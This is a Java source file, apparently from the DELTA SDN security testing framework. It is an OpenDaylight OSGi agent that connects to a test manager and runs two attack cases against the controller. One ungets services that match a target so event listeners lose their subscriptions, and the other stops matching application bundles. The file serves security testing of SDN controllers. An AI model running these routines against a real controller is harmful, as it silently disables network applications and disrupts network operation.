/**
 * Copyright (c) 2013 Cisco Systems, Inc. and others.  All rights reserved.
 * <p>
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License v1.0 which accompanies this distribution,
 * and is available at http://www.eclipse.org/legal/epl-v10.html
 */
package org.deltaproject.odlagent.core;

import org.apache.felix.dm.Component;
import org.apache.felix.dm.DependencyActivatorBase;
import org.apache.felix.dm.DependencyManager;
import org.opendaylight.controller.sal.binding.api.RpcProviderRegistry;
import org.opendaylight.yang.gen.v1.urn.opendaylight.flow.service.rev130819.SalFlowService;
import org.osgi.util.tracker.ServiceTracker;
import org.opendaylight.controller.md.sal.binding.api.DataBroker;
import org.opendaylight.controller.sal.binding.api.BindingAwareBroker;
import org.opendaylight.controller.sal.binding.api.BindingAwareBroker.ConsumerContext;
import org.opendaylight.controller.sal.binding.api.BindingAwareConsumer;
import org.opendaylight.controller.sal.binding.api.NotificationService;
import org.opendaylight.yang.gen.v1.urn.opendaylight.packet.service.rev130709.PacketProcessingService;
import org.osgi.framework.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.Arrays;
import java.util.Dictionary;
import java.util.List;

/**
 * Activator is derived from AbstractBindingAwareConsumer, which takes care
 * of looking up MD-SAL in Service Registry and registering consumer
 * when MD-SAL is present.
 */
public class Activator extends DependencyActivatorBase implements AutoCloseable, BindingAwareConsumer {
    private static final Logger LOG = LoggerFactory.getLogger(Activator.class);

    private AppAgent appAgent;
    private Interface cm;

    /**
     * Invoked first
     */
    @Override
    public void init(BundleContext bundleContext, DependencyManager dependencyManager) throws Exception {
        ServiceReference<BindingAwareBroker> brokerRef = bundleContext.getServiceReference(BindingAwareBroker.class);
        BindingAwareBroker broker = bundleContext.getService(brokerRef);
        broker.registerConsumer(this);
    }

    /**
     * Invoked when consumer is registered to the MD-SAL.
     */
    @Override
    public void onSessionInitialized(ConsumerContext session) {
        /**
         * We create instance of our AppAgent
         * and set all required dependencies,
         *
         * which are
         *   Data Broker (data storage service) - for configuring flows and reading stored switch state
         *   PacketProcessingService - for sending out packets
         *   NotificationService - for receiving notifications such as packet in.
         *
         */

        appAgent = new AppAgentImpl();
        appAgent.setDataBroker(session.getSALService(DataBroker.class));
        appAgent.setSalFlowService(session.getRpcService(SalFlowService.class));
        appAgent.setPacketProcessingService(session.getRpcService(PacketProcessingService.class));
        appAgent.setNotificationService(session.getSALService(NotificationService.class));
        appAgent.start();

        connectManager();
    }

    @Override
    public void close() {
        LOG.info("[App-Agent] close() passing");
        if (appAgent != null) {
            appAgent.stop();
        }
    }

    @Override
    public void destroy(BundleContext bundleContext, DependencyManager dependencyManager) throws Exception {

    }

    public void connectManager() {
        cm = new Interface();
        cm.setActivator(this);
        cm.setServerAddr();
        cm.connectServer("ActAgent");
        cm.start();
    }

    /*
     * 3.1.090: Event Listener Unsubscription
     */
    public String testEventListenerUnsubscription(String target) {
        LOG.info("[App-Agent] Event Listener Unsubscription attack");

        Bundle[] blist = getBundleContext().getBundles();
        boolean isUnreg = false;

        if (blist == null) {
            LOG.info("[App-Agent] bundle list is NULL");
            return "null";
        }

        for (Bundle b : blist) {
            ServiceReference<?>[] serviceReferences = b.getServicesInUse();

            if (serviceReferences != null) {
                for (ServiceReference sr : serviceReferences) {
                    if (sr.toString().contains(target)) {
                        LOG.info("[App-Agent] unget service " + b.getSymbolicName() + ":" + sr.toString());
                        if (b.getBundleContext().ungetService(sr)) {
                            isUnreg = true;
                        }
                    }
                }
            }
        }

        if (isUnreg)
            return target;
        else
            return "null";
    }

    /*
     * 3.1.100: Application Eviction
     */
    public String testApplicationEviction(String target) {
        if (target.contains("restore")) {
            Bundle[] blist = getBundleContext().getBundles();
            boolean restart = false;

            if (blist == null) {
                System.out.println("DELTA bundle list is NULL");
                return "null";
            }

            for (Bundle b : blist) {
                if (b.getSymbolicName().contains("l2switch")) {

                    try {
                        b.start();
                    } catch (BundleException e) {
                        e.printStackTrace();
                    }
                }

            }
            return "OK";
        }

        System.out.println("[App-Agent] Application Eviction attack");

        Bundle[] blist = getBundleContext().getBundles();
        boolean isStopped = false;

        if (blist == null) {
            System.out.println("DELTA bundle list is NULL");
            return "null";
        }

        for (Bundle b : blist) {
            if (b.getSymbolicName().contains(target)) {
                System.out.println("[App-Agent] Stop - " + b.getSymbolicName());

                try {
                    b.stop();
                    isStopped = true;
                } catch (BundleException e) {
                    e.printStackTrace();
                }
            }

        }

        if (isStopped)
            return target;
        else
            return "null";
    }
}